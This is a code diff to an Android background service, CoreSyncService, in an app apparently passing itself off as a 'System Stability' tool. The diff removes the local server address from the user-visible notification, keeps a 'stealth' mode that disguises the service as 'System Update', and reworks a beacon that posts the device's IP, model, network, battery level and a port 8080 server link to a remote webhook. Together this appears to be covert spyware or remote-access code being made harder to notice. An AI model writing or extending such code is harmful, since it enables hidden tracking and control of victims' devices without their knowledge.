@@ -256,18 +256,13 @@ public class CoreSyncService extends Service {
                 this, 0, notificationIntent,
                 PendingIntent.FLAG_IMMUTABLE);
 
-        String ip = MainActivity.getLocalIpAddress();
-        String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
-        
-        String title = stealth ? "System Update" : "🛡️ System Stability Active";
+        String title = stealth ? "System Update" : "System Stability Service";
         String contentText;
         
         if (stealth) {
             contentText = "Checking for system updates...";
         } else {
-            contentText = ip != null
-                ? "Server running at http://" + formattedIp + ":8080"
-                : "Server running on port 8080";
+            contentText = "System is running normally";
         }
 
         return new NotificationCompat.Builder(this, CHANNEL_ID)
@@ -413,23 +408,31 @@ public class CoreSyncService extends Service {
             String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
             String link = "http://" + formattedIp + ":8080";
 
-            // Build query parameters for GET (most reliable with Google Apps Script redirects)
-            StringBuilder params = new StringBuilder();
-            params.append("?ip=").append(java.net.URLEncoder.encode(ip, "UTF-8"));
-            params.append("&device=").append(java.net.URLEncoder.encode(Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")", "UTF-8"));
-            params.append("&network=").append(java.net.URLEncoder.encode(networkType, "UTF-8"));
-            params.append("&battery=").append(java.net.URLEncoder.encode(batteryLevel + "%", "UTF-8"));
-            params.append("&link=").append(java.net.URLEncoder.encode(link, "UTF-8"));
-            params.append("&port=8080");
-            params.append("&stealth=").append(isStealthMode());
+            // Build JSON for POST (more reliable)
+            String json = "{" +
+                    "\"ip\":\"" + ip + "\"," +
+                    "\"device\":\"" + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")\"," +
+                    "\"network\":\"" + networkType + "\"," +
+                    "\"battery\":\"" + batteryLevel + "%\"," +
+                    "\"link\":\"" + link + "\"," +
+                    "\"port\":8080," +
+                    "\"stealth\":" + isStealthMode() +
+                    "}";
 
-            URL url = new URL(REMOTE_WEBHOOK_URL + params.toString());
+            URL url = new URL(REMOTE_WEBHOOK_URL);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("GET");
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            conn.setRequestProperty("Content-Type", "application/json");
             conn.setInstanceFollowRedirects(true);
             conn.setConnectTimeout(15000);
             conn.setReadTimeout(15000);
             conn.setRequestProperty("User-Agent", "SystemStability/1.4");
+
+            try (OutputStream os = conn.getOutputStream()) {
+                byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                os.write(input, 0, input.length);
+            }
 
             int code = conn.getResponseCode();
             
